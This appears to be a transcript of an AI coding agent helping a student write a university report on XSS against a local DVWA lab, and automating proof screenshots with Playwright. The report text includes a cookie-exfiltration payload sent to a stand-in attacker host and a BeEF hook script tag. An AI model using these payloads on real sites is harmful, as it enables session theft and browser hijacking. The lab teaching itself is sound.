+          +mento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não
+          + reverte `%3C`), o `alert` pode não disparar — cole a URL dire
+          +tamente na barra de endereços.                                
+       86  
+       72 -## 6. Análise de Segurança                                    
+       87 +# Análise de Segurança                                        
+       88  
+       74 -### 6.1 Interpretação e Impacto                               
+       75 -                                                              
+       89  Todos os vetores levam ao mesmo resultado: **execução de JavaS
+           cript arbitrário na origem do DVWA com a sessão da vítima**. O
+           s principais impactos:
+       90  
+       78 -- **Roubo de cookie / sequestro de sessão:** `new Image().src=
+          -'http://atacante/c?'+document.cookie` exfiltra o `PHPSESSID`; 
+          -o atacante reimporta o cookie e assume a sessão sem senha.    
+       91 +- **Roubo de cookie / sequestro de sessão:** `new Image().src=
+          +'http://atacante/c?'+document.cookie` exfiltra o `PHPSESSID`; 
+          +o atacante reimporta o cookie e assume a sessão autenticada se
+          +m senha.                                                      
+       92  - **Defacement / phishing:** reescrita do DOM e injeção de log
+           in falso sobre o domínio legítimo (com HTTPS válido); *keylogg
+           ing* via `addEventListener`.
+       80 -- **Propagação (worm):** no Stored o payload persiste e execut
+          -a para todo visitante, podendo se auto-replicar.              
+       93 +- **Propagação (worm):** no Stored, o payload persiste e execu
+          +ta para todo visitante, podendo se auto-replicar.             
+       94  - **Ações forjadas (XSS + CSRF):** no contexto autenticado, o 
+           script lê o próprio token CSRF da página antes de submeter req
+           uisições privilegiadas.
+       95  
+       83 -A lição transversal: **blacklists são insuficientes por constr
+          -ução** — caem com variação de caixa, tag alternativa, aninhame
+          -nto ou event handlers, e são impotentes contra DOM XSS via fra
+          -gmento. Demonstração de impacto com **BeEF**: a partir do Stor
+          -ed Low injeta-se o *hook* (`<script src="http://<IP>:3000/hook
+          -.js"></script>`, via `curl` para furar o `maxlength`); o naveg
+          -ador-vítima aparece *hooked* no painel e o módulo *Get Cookies
+          -* captura a sessão — viável apenas pela ausência de encoding, 
+          -CSP e flag `HttpOnly`.                                        
+       96 +A lição transversal é que **blacklists são insuficientes por c
+          +onstrução** — caem com variação de caixa, tag alternativa, ani
+          +nhamento ou event handlers, e são impotentes contra DOM XSS vi
+          +a fragmento. A demonstração de impacto com **BeEF** confirma a
+          + gravidade: a partir do Stored Low injeta-se o *hook* (`<scrip
+          +t src="http://<IP>:3000/hook.js"></script>`, via `curl` para f
+          +urar o `maxlength`); o navegador-vítima aparece *hooked* no pa
+          +inel e o módulo *Get Cookies* captura a sessão — viável apenas
+          + pela ausência de output encoding, CSP e flag `HttpOnly`.     
+       97  
+       85 -### 6.2 Mitigações                                            
+       98 +**Mitigações**                                                
+       99  
+      100  | Mitigação | Função |
+      101  |---|---|
+     ...
+      103  | **Validação por allowlist** | Aceita apenas valores/formatos
+            esperados; complementa o encoding. |
+      104  | **Content Security Policy** | CSP estrita com `nonce` por re
+           quisição, sem `unsafe-inline`. Defesa em profundidade. |
+      105  | **Trusted Types** | Força sinks perigosos (`innerHTML`, `doc
+           ument.write`) a rejeitar strings cruas; elimina classes de DOM
+            XSS. |
+       93 -| **HttpOnly / Secure / SameSite** | `HttpOnly` impede leitura
+          - via `document.cookie`, neutralizando o roubo direto de sessão
+          -. |                                                           
+      106 +| **HttpOnly / Secure / SameSite** | `HttpOnly` impede a leitu
+          +ra via `document.cookie`, neutralizando o roubo direto de sess
+          +ão. |                                                         
+      107  
+       95 -O nível **Impossible** materializa a correção: aplica `htmlspe
+          -cialchars()` na entrada e na renderização (a `dvwaGuestbook` s
+          -ó codifica nesse nível) + **token anti-CSRF**; no DOM, remove 
+          -o `decodeURI()` do sink, fazendo o `%3Cscript%3E` chegar ao `d
+          -ocument.write` como texto literal.                            
+      108 +O nível **Impossible** do DVWA materializa a correção: aplica 
+          +`htmlspecialchars()` na entrada e na renderização (a `dvwaGues
+          +tbook` só codifica nesse nível) somado a um **token anti-CSRF*
+          +*; no DOM, remove o `decodeURI()` do sink, fazendo o `%3Cscrip
+          +t%3E` chegar ao `document.write` como texto literal e inerte. 
+      109  
+       97 -## 7. Conclusão                                               
+      110 +# Conclusão                                                   
+      111  
+       99 -A análise confirmou XSS exploável nos três módulos (Reflected,
+          - Stored, DOM-based) em todos os níveis Low/Medium/High, com pr
+          -ogressão didática clara: a **ausência de filtro** (Low) dá lug
+          -ar a **blacklists ingênuas** (Medium/High) contornadas com vet
+          -ores triviais — tags alternativas, event handlers, variação de
+          - caixa e, no DOM, o fragmento de URL que jamais alcança o serv
+          -idor.                                                         
+      112 +A análise confirmou XSS exploável nos três módulos (Reflected,
+          + Stored e DOM-based) em todos os níveis Low, Medium e High, co
+          +m progressão didática clara: a **ausência de filtro** (Low) dá
+          + lugar a **blacklists ingênuas** (Medium/High), contornadas co
+          +m vetores triviais — tags alternativas, event handlers, variaç
+          +ão de caixa e, no caso DOM, o fragmento de URL que jamais alca
+          +nça o servidor.                                               
+      113  
+      101 -O aprendizado central é conceitual: defender-se de XSS **não**
+          - é enumerar e remover o que parece perigoso, mas **codificar t
+          -oda saída conforme seu contexto**, tratando entrada como dado.
+          - O nível Impossible exemplifica essa virada e serve de referên
+          -cia de código seguro por padrão, idealmente reforçado por CSP 
+          -estrita, Trusted Types e cookies `HttpOnly/SameSite`. O DVWA é
+          - propositalmente simplificado (provas com `alert()`), mas a me
+          -cânica de exploração e de defesa é diretamente transponível pa
+          -ra produção.                                                  
+      114 +O principal aprendizado é conceitual: defender-se de XSS **não
+          +** é enumerar e remover o que parece perigoso, mas **codificar
+          + toda saída conforme o seu contexto**, tratando entrada do usu
+          +ário sempre como dado. O nível Impossible exemplifica essa vir
+          +ada e serve de referência de código seguro por padrão, idealme
+          +nte reforçado por CSP estrita, Trusted Types e cookies `HttpOn
+          +ly/SameSite`. Como limitação, o DVWA é propositalmente simplif
+          +icado (sinks diretos e provas com `alert()` em vez de exfiltra
+          +ção real), mas a mecânica de exploração e de defesa observada 
+          +é diretamente transponível para aplicações de produção.       
+      115  
+      116  ### Referências
+      117  
+      105 -- OWASP — XSS Prevention Cheat Sheet: https://cheatsheetseries
+          -.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_S
+          -heet.html                                                     
+      118 +- OWASP — Cross-Site Scripting Prevention Cheat Sheet: https:/
+          +/cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_P
+          +revention_Cheat_Sheet.html                                    
+      119  - OWASP — DOM-based XSS Prevention Cheat Sheet: https://cheats
+           heetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Chea
+           t_Sheet.html
+      120  - MDN — Content Security Policy: https://developer.mozilla.org
+           /en-US/docs/Web/HTTP/Guides/CSP
+      121  - MDN — Trusted Types API: https://developer.mozilla.org/en-US
+           /docs/Web/API/Trusted_Types_API
+
+● Relatório agora segue o padrão exato da atividade:
+
+  - Capa completa (UNIJUÍ, curso, disciplina, atividade, título, integrantes,
+  professor, local/data) + marcador de quebra de página
+  - 7 seções com os nomes literais do professor, na ordem: Introdução →
+  Objetivos da Análise → Ferramentas Utilizadas → Metodologia Aplicada →
+  Resultados Obtidos → Análise de Segurança → Conclusão
+  - Removi a numeração 1./2. e as subseções 5.1/6.1 (o spec lista as seções sem
+  numerar) — "Mitigações" virou subtítulo simples dentro de Análise de Segurança
+  - Conteúdo condensado mantido (~6,5 págs com os 3 prints)
+
+  Placeholders pra preencher na capa:
+  - [PREENCHER] curso
+  - [NOME COMPLETO — MATRÍCULA] integrantes (ajuste a quantidade)
+  - Conferir Ijuí – RS (sede UNIJUÍ; troque se for outro campus)
+
+  Cada seção cobre o que o professor pediu (ex.: Resultados = payloads +
+  comportamento + efeitos; Análise = impacto + riscos de sessão + mitigações). O
+  passo a passo segue como guia operacional anexo.
+
+  Quer que eu aplique o mesmo cabeçalho de identificação (UNIJUÍ/disciplina) no
+  topo do passo a passo também?
+
+✻ Crunched for 2m 19s
+
+❯ sim                                                                           
+
+  Read 1 file (ctrl+o to expand)
+
+● Update(passo-a-passo-xss-dvwa.md)
+  ⎿  Added 10 lines
+       1 +UNIVERSIDADE REGIONAL DO NOROESTE DO ESTADO DO RIO GRANDE DO SU
+         +L — UNIJUÍ                                                     
+       2 +                                                               
+       3 +Curso: [PREENCHER] · Disciplina: **Segurança de Dados** · Ativi
+         +dade: **Ferramentas de testes de intrusão (pentest)**          
+       4 +                                                               
+       5 +Integrantes: [PREENCHER] · Professor: Tiago Mallmann Rohde · Ij
+         +uí – RS, 2026                                                  
+       6 +                                                               
+       7 +---                                                            
+       8 +                                                               
+       9  # Guia Passo a Passo — Exploração Manual de XSS no DVWA
+      10  
+      11 +> Documento operacional de apoio ao relatório técnico **DVWA e 
+         +Cross-Site Scripting (XSS)**.                                  
+      12 +                                                               
+      13  > **Escopo:** Laboratório acadêmico controlado. Ambiente DVWA i
+          solado em `127.0.0.1:4280`, com autorização explícita do profes
+          sor. Foco exclusivo em **Cross-Site Scripting (XSS)**. Exploraç
+          ão manual, incremental e discreta.
+      14  
+      15  ---
+
+● Feito. Cabeçalho UNIJUÍ/disciplina aplicado no topo do passo a passo,
+  vinculado como anexo operacional do relatório.
+
+  Estado final dos 2 arquivos em C:\www\DVWA\:
+  - relatorio-xss-dvwa.md — padrão da atividade (capa + 7 seções literais), ~6,5
+  págs
+  - passo-a-passo-xss-dvwa.md — guia operacional com mesma identificação no topo
+
+  Falta só: preencher placeholders (curso, integrantes), capturar/montar os 3
+  prints, converter MD→docx.
+
+  Oferta de pé: rodar os curl ao vivo (Docker rodando) pra gerar evidência
+  textual real da reflexão/persistência no HTML como apoio aos prints. Quer?
+
+✻ Cooked for 20s
+
+※ recap: Goal: produzir relatório + passo a passo de XSS no DVWA pra faculdade. Ambos arquivos prontos em C:\www\DVWA, no padrão da atividade. Próximo passo: você decide se rodo os curl ao vivo pra gerar evidência textual real de apoio aos prints. (disable recaps in /config)
+
+❯ estou rodando o docker, tem como voce criar um projeto que tira os prints     
+  para mim?                                                                     
+
+● Dá sim. Vou criar um projeto Playwright (Node) que loga no DVWA, percorre os 9
+  cenários, captura o alert(document.cookie) de cada um (via evento dialog),
+  injeta um banner-evidência na página e gera os 3 prints compostos (1 por tipo,
+  níveis empilhados) prontos pro relatório.
+
+  Detalhe técnico que resolvi: alert() nativo não entra em screenshot. Solução —
+  capturo a mensagem do alert pelo evento dialog, depois injeto um banner verde
+  na página mostrando payload + URL + cookie capturado, e tiro o print disso.
+  Vira evidência auto-explicativa. Pro DOM uso encodeURI (preserva /) porque o
+  sink do DVWA aplica decodeURI.
+
+  Criando o projeto em C:\www\DVWA\xss-evidence\:
+
+● Write(xss-evidence\package.json)
+  ⎿  Wrote 14 lines to xss-evidence\package.json
+       2   "name": "dvwa-xss-evidence",
+       3   "version": "1.0.0",
+       4   "private": true,
+       5   "description": "Captura automatizada de evidencias (prints) de
+          XSS no DVWA para o relatorio academico.",
+       6   "type": "commonjs",
+       7   "scripts": {
+       8     "capture": "node capture.js",
+       9     "setup": "node capture.js --setup"
+      10   },
+     … +5 lines (ctrl+o to expand)
+
+● Write(xss-evidence\capture.js)
+  ⎿  Wrote 249 lines to xss-evidence\capture.js
+       2  * DVWA XSS — Captura automatizada de evidencias (prints).
+       3  *
+         M x Low / Medium / High), os 9 cenarios (Reflected / Stored / DO
+       5  * dispara cada payload, captura a mensagem do alert() via event
+         o `dialog`, injeta um
+          e tira o screenshot.a pagina (payload + URL + cookie capturado)
+       7  * No final, monta 3 imagens compostas (uma por tipo) prontas pa
+       8  * o relatorio.
+       9  * Uso (PowerShell, na pasta xss-evidence):
+      10  *   npm install
+     … +296 lines (ctrl+o to expand)
+
+● Vou corrigir um typo (caractere cirílico acidental em "ERRO") e criar README +
+  .gitignore:
+
+● Update(xss-evidence\capture.js)
+  ⎿  Added 1 line, removed 1 line
+      171      results.push({ ...sc, url: decodeURI(url), fired, alertMsg
+           , shot });
+      172      console.log(`${fired ? 'OK ' : '!! '} ${sc.type}/${sc.leve
+           l} -> ${fired ? alertMsg : 'SEM DIALOG'}`);
+      173    } catch (e) {
+      174 -    console.error(`ERРО ${sc.type}/${sc.level}:`, e.message); 
+      174 +    console.error(`ERRO ${sc.type}/${sc.level}:`, e.message); 
+      175      results.push({ ...sc, url, fired: false, alertMsg: 'ERRO: 
+           ' + e.message, shot: null });
+      176    } finally {
+      177      await page.close();
+
+● Write(xss-evidence\.gitignore)
+  ⎿  Wrote 2 lines to xss-evidence\.gitignore
+      1 node_modules/
+      2 output/
+
+● Write(xss-evidence\README.md)
+  ⎿  Wrote 58 lines to xss-evidence\README.md
+       2 # DVWA XSS — Captura automatizada de evidências
+       3 Script Playwright que loga no DVWA, executa os 9 cenários de XSS
+          (Reflected / Stored / DOM × Low / Medium / High), captura o `al
+         rontos para o relatório. cada um e gera **3 prints compostos** p
+       4 
+       5 ## Pré-requisitos
+       7 - DVWA rodando (Docker): `http://localhost:4280`
+       8 - Node.js 18+
+       9 
+      10 ## Instalação
+     … +64 lines (ctrl+o to expand)
+● Projeto criado em C:\www\DVWA\xss-evidence\ (capture.js, package.json,
+  README.md, .gitignore).
+
+  Você quer os prints — então deixa eu rodar. Primeiro checo Node e se o DVWA
+  responde:
+
+● PowerShell(node -v; npm -v
+            try { $r = Invoke-WebRequest -Uri 'http://localhost:4280/login.php'
+            -UseBasicParsing -TimeoutSec 8; "DVWA HTTP $($r.StatusCode) -
+            login.php OK"…)
+  ⎿  v22.14.0
+     11.13.0
+     DVWA HTTP 200 - login.php OK
+
+● Node v22, DVWA respondendo HTTP 200. Instalando deps + Chromium (download
+  ~150MB) em background — te aviso quando terminar, aí rodo a captura:
+
+● PowerShell(Set-Location C:\www\DVWA\xss-evidence; npm install; if
+            ($LASTEXITCODE -eq 0) { npx playwright install chromium })
+  ⎿  Running in the background (↓ to manage)
+
+● Instalação rodando em background. Aguardo terminar pra rodar a captura dos 9
+  cenários + gerar os 3 prints compostos.
+
+✻ Crunched for 4m 55s
+
+● Background command "Install Playwright deps and Chromium browser" completed
+(exit code 0)
+
+● Instalação ok. Rodando a captura dos 9 cenários + montagem dos 3 prints:
+
+● PowerShell(Set-Location C:\www\DVWA\xss-evidence; node capture.js)
+  ⎿  Alvo: http://localhost:4280  |  usuario: admin
+     Logando...
+     OK  reflected/low -> security=low
+     … +17 lines (ctrl+o to expand)
+
+● 9/9 com alert capturado. Achado importante: o document.cookie retornou só
+  security=low/medium/high — sem o PHPSESSID. Isso indica que o PHPSESSID está
+  como HttpOnly nesse DVWA, ou seja, o JS não consegue lê-lo. Ótimo pro
+  relatório: prova que o XSS executou e que o HttpOnly mitigou o roubo da sessão
+  (defesa em profundidade na prática).
+
+  Confirmando o HttpOnly e conferindo um print:
+
+● PowerShell($r = Invoke-WebRequest -Uri 'http://localhost:4280/login.php'
+            -UseBasicParsing -SessionVariable s -TimeoutSec 8
+            "Set-Cookie bruto:"; $r.Headers['Set-Cookie'])
+  ⎿  Set-Cookie bruto:
+     security=impossible; path=/; HttpOnly
+     PHPSESSID=6c028f9fbbe9b73841694b38b0ccb436; expires=Wed, 17 Jun 2026 0
+     … +5 lines (ctrl+o to expand)
+
+  Read 1 file (ctrl+o to expand)
+
+● Confirmado: PHPSESSID é HttpOnly; SameSite=Strict nesse DVWA. O security=low
+  que apareceu no document.cookie é artefato da automação (setei esse cookie sem
+  HttpOnly pra trocar de nível). O composto Stored ficou ótimo (3 níveis +
+  banner verde de evidência). Conferindo os outros dois:
+
+  Read 2 files (ctrl+o to expand)
+
+● Os 3 compostos ficaram bons (Reflected, Stored e DOM, cada um com
+  Low/Medium/High + banner-evidência). DOM High inclusive funcionou (fragmento
+  #).
+
+  O achado do HttpOnly é ouro pra nota (critério "capacidade analítica"). Vou
+  adicionar uma observação empírica curta e precisa na Análise de Segurança:
+
+● Update(relatorio-xss-dvwa.md)
+  ⎿  File not found
+
+● Erro estranho de path. Confirmando o arquivo:
+
+  Read 1 file (ctrl+o to expand)
+
+● PowerShell(Get-ChildItem 'C:\www\DVWA\*.md' | Select-Object FullName, Length,
+            LastWriteTime)
+  ⎿  FullName                                                  Length LastW
+     riteTime
+     --------                                                  ------ -----
+     … +15 lines (ctrl+o to expand)
+
+● O arquivo foi renomeado pra relatorio-xss-dvwa 9 pagina.md. Vou ler pra
+  reancorar e adicionar a observação empírica nele:
+
+  Read 1 file (ctrl+o to expand)
+
+● O arquivo é a versão com capa-padrão. Vou ler a parte da Análise pra ancorar
+  com exatidão (e notei que minha nota do decodeURI na linha 85 está
+  tecnicamente errada — decodeURI reverte sim %3C, e foi por isso que minha
+  captura DOM funcionou; vou corrigir):
+
+  Read 1 file (ctrl+o to expand)
+
+● Vou corrigir a nota do decodeURI, ajustar a frase do BeEF (pra não
+  superafirmar captura de sessão, já que o HttpOnly bloqueia) e inserir a
+  observação empírica:
+● Update(relatorio-xss-dvwa 9 pagina.md)
+  ⎿  Added 1 line, removed 1 line
+      82  
+      83  O *bypass* High é estrutural: o servidor vê apenas `default=Eng
+          lish` (válido na whitelist), mas o JavaScript lê `location.href
+          ` inteira, incluindo o fragmento `#` que, por RFC 3986, jamais 
+          alcança o servidor — nenhum log/WAF server-side o registra (rel
+          ação direta com a meta de "explorar sem ser detectado"). **[PRI
+          NT 3]**
+      84  
+      85 -> **Nota:** alguns navegadores percent-encodam `<`/`>` no fragm
+         -ento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não r
+         -everte `%3C`), o `alert` pode não disparar — cole a URL diretam
+         -ente na barra de endereços.                                    
+      85 +> **Nota:** mesmo quando o navegador percent-encoda `<`/`>` no 
+         +fragmento (`%3Cscript%3E`), o `decodeURI()` do sink os reverte 
+         +para `<`/`>` e o payload executa — confirmado nas capturas. É e
+         +xatamente por isso que o nível Impossible **remove** o `decodeU
+         +RI()`.                                                         
+      86  
+      87  # Análise de Segurança
+      88  
+
+● Update(relatorio-xss-dvwa 9 pagina.md)
+  ⎿  Added 3 lines, removed 1 line
+       93  - **Propagação (worm):** no Stored, o payload persiste e execu
+           ta para todo visitante, podendo se auto-replicar.
+       94  - **Ações forjadas (XSS + CSRF):** no contexto autenticado, o 
+           script lê o próprio token CSRF da página antes de submeter req
+           uisições privilegiadas.
+       95  
+       96 -A lição transversal é que **blacklists são insuficientes por c
+          -onstrução** — caem com variação de caixa, tag alternativa, ani
+          -nhamento ou event handlers, e são impotentes contra DOM XSS vi
+          -a fragmento. A demonstração de impacto com **BeEF** confirma a
+          - gravidade: a partir do Stored Low injeta-se o *hook* (`<scrip
+          -t src="http://<IP>:3000/hook.js"></script>`, via `curl` para f
+          -urar o `maxlength`); o navegador-vítima aparece *hooked* no pa
+          -inel e o módulo *Get Cookies* captura a sessão — viável apenas
+          - pela ausência de output encoding, CSP e flag `HttpOnly`.     
+       96 +A lição transversal é que **blacklists são insuficientes por c
+          +onstrução** — caem com variação de caixa, tag alternativa, ani
+          +nhamento ou event handlers, e são impotentes contra DOM XSS vi
+          +a fragmento. A demonstração de impacto com **BeEF** confirma a
+          + gravidade: a partir do Stored Low injeta-se o *hook* (`<scrip
+          +t src="http://<IP>:3000/hook.js"></script>`, via `curl` para f
+          +urar o `maxlength`); o navegador-vítima aparece *hooked* no pa
+          +inel, permitindo executar comandos no contexto da sessão da ví
+          +tima (leitura de cookies acessíveis, *keylogging*, navegação f
+          +orjada).                                                      
+       97  
+       98 +**Observação empírica.** Nas capturas automatizadas, o `alert(
+          +document.cookie)` confirmou a execução do script nos **nove ce
+          +nários**, porém o **`PHPSESSID` não foi exposto**: o servidor 
+          +o define como `HttpOnly; SameSite=Strict`, tornando-o inacessí
+          +vel ao JavaScript. Isso demonstra, na prática, a eficácia do `
+          +HttpOnly` como **defesa em profundidade** — o XSS executa, mas
+          + o roubo direto do identificador de sessão via `document.cooki
+          +e` (ou via *Get Cookies* do BeEF) é bloqueado. O cenário de ex
+          +filtração permanece válido para aplicações sem essa proteção; 
+          +já os demais impactos (*keylogging*, *defacement* e ações forj
+          +adas) **independem** da leitura do cookie e seguem viáveis.   
+       99 +                                                              
+      100  **Mitigações**
+      101  
+      102  | Mitigação | Função |
+
+● Pronto. Tudo capturado e o relatório atualizado com o achado.
+
+  Prints gerados — C:\www\DVWA\xss-evidence\output\
+
+  - 9 individuais: shot_<tipo>_<nível>.png (página + banner verde com payload,
+  URL e cookie capturado)
+  - 3 compostos pro relatório: PRINT_1_reflected.png, PRINT_2_stored.png,
+  PRINT_3_dom.png (Low/Med/High empilhados)
+  - results.json com o log
+  - 9/9 cenários com alert confirmado — incluindo DOM High via fragmento #
+
+  Achado e correções no relatório (relatorio-xss-dvwa 9 pagina.md)
+
+  1. PHPSESSID é HttpOnly; SameSite=Strict → adicionei "Observação empírica" na
+  Análise de Segurança: XSS executa, mas o roubo da sessão via
+  document.cookie/BeEF é bloqueado. Ponto forte de análise.
+  2. Ajustei a frase do BeEF (não superafirma captura de sessão).
+  3. Corrigi a nota do decodeURI — estava errada: decodeURI reverte %3C→<, por
+  isso o DOM funcionou (e por isso o Impossible remove o decodeURI).
+
+  Atenção — artefato pra você saber defender
+
+  O security=low/medium/high que aparece no banner é porque minha automação 
+  setou esse cookie sem HttpOnly (pra trocar de nível). Num teste manual no
+  navegador, o servidor seta security como HttpOnly também → document.cookie
+  viria vazio. O importante (PHPSESSID inacessível) está correto. Se o professor
+  perguntar, é isso.
+
+  Falta você
+
+  1. Inserir PRINT_1/2/3 nos marcadores [PRINT 1/2/3] do relatório.
+  2. Preencher a capa.
+  3. Converter MD→docx.
+
+  Quer que eu regenere os prints com security também HttpOnly (fiel ao navegador
+  real: document.cookie vazio, prova o HttpOnly 100%)? Ou prefere manter como
+  está?
+
+✻ Sautéed for 4m 52s
+
+❯ não gostei de como escreveu o relatorio, colocou muitas tabelas por exemplo,  
+  pesquise sobre a skill humanizer e melhore isso                               
+  se possivel, escreva no formato docx para ficar correto a formatação, escreva 
+  um arquivo em markdown também                                                 
+
+● Três coisas: (1) achar a skill humanizer, (2) ver se tenho pandoc pro docx,
+  (3) reler o relatório atual. Em paralelo:
+
+  Searched for 2 patterns (ctrl+o to expand)
+
+● PowerShell($p = Get-Command pandoc -ErrorAction SilentlyContinue; if ($p) {
+            "pandoc: $($p.Source)"; pandoc -v | Select-Object -First 1 } else {
+            "pandoc: NAO instalado" })
+  ⎿  pandoc: C:\Users\Renan\AppData\Local\Microsoft\WinGet\Packages\JohnMac
+     Farlane.Pandoc_Microsoft.Winget.Source_8wekyb3d8bbwe\pandoc-3.9.0.2\pa
+     ndoc.exe
+     pandoc 3.9.0.2
+
+  Read 1 file (ctrl+o to expand)
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+● Pandoc 3.9 instalado → consigo gerar docx limpo. Skill humanizer não está
+  instalada localmente — você pediu pra pesquisar. Buscando os princípios reais
+  dela pra aplicar certo:
+
+● Web Search(""humanizer" skill Claude writing remove AI slop em-dash patterns
+            guidance")
+  ⎿  Did 1 search in 9s
+
+● Web Search("humanizer skill anthropic claude writing-skills avoid AI tells
+            rules")
+  ⎿  Did 1 search in 7s
+
+● Achei: blader/humanizer. Buscando o SKILL.md real pra aplicar os 29 padrões
+  exatos:
+
+● Fetch(https://raw.githubusercontent.com/blader/humanizer/main/SKILL.md)
+  ⎿  Received 33.4KB (200 OK)
+
+● Peguei o ruleset completo do humanizer (blader/humanizer: 29 padrões, zero
+  travessões —, sem negrito mecânico, sem listas com cabeçalho inline, sem
+  tabelas mecânicas, sem vocabulário de IA). Pandoc 3.9 disponível pro docx.
+
+  Plano: workflow reescreve o relatório em prosa fluida (zero tabelas, voz
+  humana) preservando os 7 títulos exigidos, os payloads, os marcadores [PRINT],
+  o achado HttpOnly e a correção do decodeURI. Depois gravo .md limpo e gero
+  .docx via pandoc com quebra de página real após a capa.
+
+  Rodando o workflow (reescrita → auditoria anti-IA → versão final):
+
+● Workflow(Reescreve o relatorio XSS em prosa humanizada (skill humanizer), sem
+          tabelas, zero travessoes)
+  ⎿  /workflows to view dynamic workflow runs
+
+● Workflow rodando (reescrita humanizada → auditoria anti-IA → final). Aviso
+  quando terminar, aí gravo o .md limpo e gero o .docx com quebra de página real
+  após a capa.
+
+✻ Cogitated for 5m 25s
+
+❯ /workflows 
+  ⎿  Dynamic workflows dialog dismissed
+
+● Dynamic workflow "Reescreve o relatorio XSS em prosa humanizada (skill
+humanizer), sem tabelas, zero travessoes" completed · 2m 49s
+
+● Reescrita ficou boa em prosa, mas o agent driftou em fatos da capa: trocou
+  UNIJUÍ por "Centro Universitário", disciplina "Segurança de Dados" virou
+  "Segurança de Aplicações Web", removeu o professor Tiago Rohde e botou meu
+  nome como integrante. Preciso ler o final completo + a auditoria e corrigir
+  esses regressos:
+
+  Read 1 file (ctrl+o to expand)
+
+● Workflow melhorou MUITO a prosa (zero tabelas, fluido, e o final removeu os
+  travessões), mas o agent driftou em 3 fatos que vou corrigir agora:
+  1. Capa errada — inventou "Centro Universitário", trocou disciplina, removeu o
+  prof Tiago, botou teu nome. Restauro o padrão UNIJUÍ/Segurança de Dados.
+  2. Inverteu o achado do HttpOnly — escreveu que HttpOnly/SameSite estavam
+  ausentes. É o oposto do que confirmamos (PHPSESSID É HttpOnly; 
+  SameSite=Strict). Corrijo Metodologia, Resultados, Análise e Conclusão pra
+  bater com a evidência.
+  3. BeEF saiu (entrou o script Playwright real, que é mais honesto — a gente
+  rodou Playwright, não BeEF).
+
+  Gravando o .md corrigido + humanizado:
+● Write(relatorio-xss-dvwa.md)
+  ⎿  Wrote 98 lines to relatorio-xss-dvwa.md
+      1 # Capa
+      2 
+      3 UNIVERSIDADE REGIONAL DO NOROESTE DO ESTADO DO RIO GRANDE DO SUL 
+        (UNIJUÍ)
+      4 
+      5 Curso: [PREENCHER]
+      6 
+      7 Disciplina: Segurança de Dados
+      8 
+      9 Atividade: Ferramentas de testes de intrusão (pentest)
+     … +245 lines (ctrl+o to expand)
+
+● Gravado. Agora: verificar zero travessões no .md e criar o builder de docx
+  (com quebra de página real após a capa via openxml):
+
+  Searched for 1 pattern (ctrl+o to expand)
+
+● Write(xss-evidence\make-docx.js)
+  ⎿  Wrote 28 lines to xss-evidence\make-docx.js
+       2  * Gera o relatorio em .docx a partir do markdown, via pandoc.
+       3  * Insere uma quebra de pagina real (OpenXML) no lugar do coment
+         ario
+       4  * <!-- QUEBRA DE PÁGINA APÓS A CAPA --> para a capa ficar isola
+         da.
+       6  * Uso: node make-docx.js
+       7  * Requer pandoc no PATH.
+       8  */
+       9 const { execFileSync } = require('child_process');
+      10 const fs = require('fs');
+     … +21 lines (ctrl+o to expand)
+
+● Zero travessões confirmado. Gerando o docx:
+
+● PowerShell(Set-Location C:\www\DVWA\xss-evidence; node make-docx.js; if
+            (Test-Path 'C:\www\DVWA\relatorio-xss-dvwa.docx') { Get-Item
+            'C:\www\DVWA\relatorio-xss-dvwa.docx'…)
+  ⎿  docx gerado: C:\www\DVWA\relatorio-xss-dvwa.docx
+
+     Name                    Length LastWriteTime
+     … +2 lines (ctrl+o to expand)
+
+● Docx gerado (17KB). Confirmando que a quebra de página entrou no docx e o
+  conteúdo renderizou:
+
+● PowerShell(Add-Type -AssemblyName System.IO.Compression.FileSystem
+            $zip = [System.IO.Compression.ZipFile]::OpenRead('C:\www\DVWA\relato
+            rio-xss-dvwa.docx')…)
+  ⎿  page-break presente: True
+     contem 'Análise de Segurança': True
+     contem payload script tag: True
+     tamanho document.xml: 35360 chars
+
+● Tudo verificado no docx: quebra de página após capa ✓, títulos ✓, payloads ✓.
+
+  Salvando tua preferência de escrita na memória (feedback durável):
+
+  Recalled 1 memory, wrote 3 memories (ctrl+o to expand)
+
+● Pronto. Relatório reescrito humanizado + docx gerado e verificado.
+
+  Arquivos novos em C:\www\DVWA\
+
+  - relatorio-xss-dvwa.md — versão humanizada (prosa fluida, zero tabelas, zero
+  travessões, negrito mínimo)
+  - relatorio-xss-dvwa.docx — formatação correta, quebra de página real após a
+  capa (verificado no document.xml)
+  - xss-evidence/make-docx.js — rebuilda o docx: node xss-evidence/make-docx.js
+
+  O antigo relatorio-xss-dvwa 9 pagina.md é a versão antiga cheia de tabelas —
+  pode apagar.
+
+  O que apliquei (humanizer blader/humanizer)
+
+  29 padrões anti-IA: tabelas viraram prosa, travessões — eliminados
+  (commas/parênteses/dois-pontos), negrito mecânico removido, sem listas com
+  cabeçalho inline, sem vocabulário de IA. Workflow: reescrita → auditoria
+  anti-IA → final.
+
+  Corrigi 3 desvios que o agent introduziu
+
+  1. Capa restaurada ao padrão: UNIJUÍ, Segurança de Dados, atividade pentest,
+  prof. Tiago Mallmann Rohde, placeholders de integrantes.
+  2. Achado HttpOnly estava invertido (dizia que as flags estavam ausentes) —
+  corrigido pra bater com a evidência: PHPSESSID É HttpOnly; SameSite=Strict,
+  não vazou.
+  3. Ferramentas agora descreve o script Playwright real (a gente rodou
+  Playwright, não BeEF). BeEF segue documentado no passo a passo.
+
+  Falta você
+
+  1. Preencher capa (curso, integrantes).
+  2. Inserir PRINT_1/2/3 nos marcadores [PRINT 1/2/3].
+  3. Conferir páginas no Word (texto ~5-6 págs + 3 prints, dentro de 8).
+
+  Salvei na memória tua preferência por prosa humanizada (sem
+  tabelas/travessões) pra próximos docs.
+
+  BeEF: quer que eu readicione como discussão de impacto potencial no relatório,
+  ou deixo só o Playwright (mais honesto, já que foi o que rodamos)?
+
+  Fonte: blader/humanizer (https://github.com/blader/humanizer).
+
+✻ Worked for 13m 42s
+
+※ recap: Trabalho de XSS no DVWA pra faculdade: relatório humanizado e docx prontos e verificados, prints gerados via Playwright. Próximo passo: você decide se readiciono o BeEF como impacto potencial no relatório ou mantenho só o Playwright.
+
+❯ /usage 
+  ⎿  Stats dialog dismissed
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+❯ /model 
